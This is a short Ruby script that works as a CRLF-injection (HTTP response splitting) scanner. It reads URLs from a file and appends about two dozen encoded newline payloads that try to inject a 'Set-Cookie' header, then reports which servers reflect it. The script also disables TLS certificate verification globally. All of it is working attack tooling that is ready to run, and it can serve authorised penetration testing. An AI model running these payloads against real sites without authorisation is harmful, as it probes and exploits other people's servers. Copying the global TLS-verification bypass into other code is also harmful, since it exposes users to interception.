#!/usr/bin/env ruby
# encoding: UTF-8

require 'rubygems'
require 'net/http'
require 'net/https' 
require 'optparse'
require 'open-uri'
require 'pp'

PAYLOADS = ["%0D%0ASet-Cookie:mycookie=myvalue",
            "%0d%0aSet-Cookie:mycookie=myvalue",
            "crlf%0dSet-Cookie:mycookie=myvalue",
            "crlf%0aSet-Cookie:mycookie=myvalue",
            "%23%0dSet-Cookie:mycookie=myvalue",
            "%0dSet-Cookie:mycookie=myvalue",
            "%0ASet-Cookie:mycookie=myvalue?foo",
            "%0aSet-Cookie:mycookie=myvalue",
            "/xxx%0ASet-Cookie:mycookie=myvalue;",
            "%0d%0aSet-Cookie:mycookie=myvalue;",
            "%0aSet-Cookie:mycookie=myvalue;",
            "%0dSet-Cookie:mycookie=myvalue;",
            "%23%0dSet-Cookie:mycookie=myvalue;",
            "%3f%0dSet-Cookie:mycookie=myvalue;",
            "/%250aSet-Cookie:mycookie=myvalue;",
            "/%25250aSet-Cookie:mycookie=myvalue;",
            "/%%0a0aSet-Cookie:mycookie=myvalue;",
            "/%3f%0dSet-Cookie:mycookie=myvalue;",
            "/%23%0dSet-Cookie:mycookie=myvalue;",
            "/%25%30aSet-Cookie:mycookie=myvalue;",
            "/%25%30%61Set-Cookie:mycookie=myvalue;",
            "/%u000aSet-Cookie:mycookie=myvalue;"]

OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE

def print_crlf_response(url)
  begin  
    PAYLOADS.each do |p|
      uri = URI(url + "/" + p)
      response = Net::HTTP.get_response(uri)
      hash_response = response.to_hash  
      
      found_headers = hash_response.select {|k,v| v.any? { |s| s.include?("mycookie=myvalue")}}
      if found_headers.any?
        puts "\nPAYLOAD: #{p}\n"
        puts "\nURL: #{url + "/" + p}\n"
        
        pp found_headers
      end
    end
  rescue Exception => e  
    puts e.message
  end
end

File.open("urls.txt", "r") do |f|
  f.each_line do |url|
    print_crlf_response(url.strip)
  end
end

